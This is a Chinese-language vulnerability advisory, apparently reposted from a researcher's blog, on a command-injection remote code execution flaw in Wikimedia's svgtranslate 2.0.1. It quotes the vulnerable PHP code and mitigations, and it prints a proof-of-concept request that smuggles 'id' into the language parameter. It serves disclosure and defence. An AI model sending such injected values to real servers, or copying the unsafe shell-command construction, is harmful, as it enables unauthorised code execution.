#  Wikimedia/svgtranslate 2.0.1 远程代码执行   
 Ots安全   2024-06-14 11:39  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
系统概述  
  
SVGTranslate由维基媒体开发，将SVG文件转换为PNG图像，同时允许在SVG内容中进行基于语言的文本替换。此 PHP 后端应用程序的结构通过 ApiController.php 和 Renderer.php 管理功能。源代码托管在 SVGTranslate 的 GitHub 存储库中。  
  
组件路径  
- API 控制器： /src/Controller/ApiController.php  
  
- 渲染服务： /src/Service/Renderer.php  
  
漏洞描述   
  
由于 PNG 生成过程中语言参数处理不当，应用程序容易受到未经身份验证的远程代码执行 （RCE） 的影响。该漏洞源于在渲染服务中构建和执行 shell 命令的方式。  
  
**漏洞分析**  
  
切入点  
  
定义如下的 API 端点处理文件名和语言参数以提供 PNG 文件，而无需对 lang 参数进行充分验证：  
  
```
/**
 * Serve a PNG rendering of the given SVG in the given language.
 * @Route("/api/file/{filename}/{lang}.png", name="api_file", methods="GET")
 * @param string $filename
 * @param string $lang
 * @return Response
 */
public function getFile(string $filename, string $lang): Response
{
    $filename = Title::normalize($filename);
    $content = $this->svgRenderer->render($this->cache->getPath($filename), $lang);
    return new Response($content, 200, ['Content-Type' => 'image/png', 'X-File-Hash' => sha1($content)]);
}
```  
  
  
渲染器漏洞  
  
在 中 Renderer.php ， lang 该参数不安全地包含在 shell 命令中，允许命令注入：  
  
```
/**
 * Render a SVG file to PNG.
 * @param string $file Full filesystem path to the SVG file to render.
 * @param string $lang Language code for rendering.
 * @param string $outFile File path for the output PNG.
 * @throws ProcessFailedException If conversion fails.
 * @return string The PNG image contents.
 */
public function render(string $file, string $lang, ?string $outFile = null) : string
{
    $command = $this->rsvgCommand.' "$SVG"';
    if ('fallback' !== $lang) {
        $command .= " --accept-language=$lang";
    }
    if ($outFile) {
        $command .= ' > "$PNG"';
    }
    $process = Process::fromShellCommandline($command);
    $process->mustRun(null, ['SVG' => $file, 'PNG' => $outFile]);
    return $process->getOutput();
}
```  
  
  
概念验证  
  
该漏洞直接在维基媒体实例上进行了测试，演示了未经授权的命令执行，如服务器响应中的系统用户信息所示：  
  
```
GET /api/file/SI_base_unit1.svg/fr;id;.png HTTP/2
Host: svgtranslate.toolforge.org
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafV99pPHLsfwfIoMZicpXgaXEq2CwN6mrY2tnzKzuMmpZePrq5m4pIEIKicqeFCt3FD2VXHj8REGcCw/640?wx_fmt=png&from=appmsg "")  
  
- 漏洞报告日期：2024 年 5 月 22 日  
  
- 漏洞修补：2024 年 5 月 23 日  
  
https://github.com/wikimedia/svgtranslate/commit/cc0aef7b2c6ba7205329b93fb95f0bdceaa89d1c  
- 漏洞暴露：自 2024 年 2 月起  
  
**缓解建议**  
  
输入验证：对所有输入参数实施严格的验证，尤其是那些合并到命令行操作中的输入参数。  
  
安全命令执行：使用数组参数执行命令，确保命令和参数分离，防止注入。  
  
安全审计和测试：进行彻底的安全审查和渗透测试，以识别和修复潜在的漏洞。  
  
```
Wikimedia/svgtranslate 2.0.1 Remote Code Execution
https://chocapikk.com/posts/2024/svgtranslate/
```  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
